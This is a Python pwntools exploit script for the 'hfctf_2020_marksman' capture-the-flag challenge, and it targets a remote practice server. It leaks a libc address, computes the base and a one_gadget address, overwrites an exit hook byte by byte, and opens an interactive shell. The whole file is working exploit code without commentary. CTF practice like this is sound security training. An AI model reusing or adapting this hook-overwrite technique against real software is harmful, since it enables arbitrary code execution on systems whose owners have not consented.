#!/usr/bin/python

from pwn import *

# r = process('./hfctf_2020_marksman')
r = remote('node3.buuoj.cn', 27424) 
elf = ELF('../../libs/ubuntu18/libc-2.27_64.so', checksec=False)

r.recvuntil('near: ')
libc_base = int(r.recv(14), 16) - elf.sym['puts']
# log.info('libc:\t' + hex(libc_base))
r.recvuntil('shoot!shoot!\n')

exit_hook = libc_base + 0x81DF68 - 8
og = 0x10a38c
rce = libc_base + og - 5
r.sendline(str(exit_hook))
off = [rce&0xFF, (rce>>8)&0xFF, (rce>>16)&0xFF]
# log.info('REC:\t', hex(rce))

for i in range(3):
    r.sendline(p8(off[i]))

r.interactive()